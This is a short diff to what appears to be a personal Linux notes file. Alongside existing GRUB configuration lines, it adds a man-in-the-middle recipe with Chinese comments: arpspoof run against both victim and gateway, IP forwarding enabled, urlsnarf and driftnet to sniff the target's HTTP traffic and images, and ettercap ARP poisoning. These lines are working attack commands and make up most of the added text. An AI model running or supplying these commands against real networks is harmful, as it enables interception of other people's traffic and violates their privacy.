@@ -255,3 +255,14 @@ sudo vi [[/etc/grub.d/40_custom]]
 		}
 			   ##################                                                                                                                                   
 sudo grub-mkconfig -o /boot/grub/grub.cfg 
+
+arpspoof -i eth0 -t victim gateway  #欺骗目标主机以为我们是网关
+arpspoof -i eth0 -t gateway victim  #在一个单独的shell里执行这个命令，欺骗网关相目标主机
+echo 1 > /proc/sys/net/ipv4/ip_forward   #启动IP转发，使得目标主机可以通过你的主机连到网关
+urlsnarf -i eth0  #用urlsnarf嗅探目标主机的http传输数据。tcp port 80 or port 8080 or port 3128。
+driftnet -i eth0 -d [[/home/tmp/]]
+
+
+ettercap -Tqi eth0 [[-M arp:remote]] //  //
+urlsnarf -i eth0 
+driftnet -i eth0 -d /home/tmp/
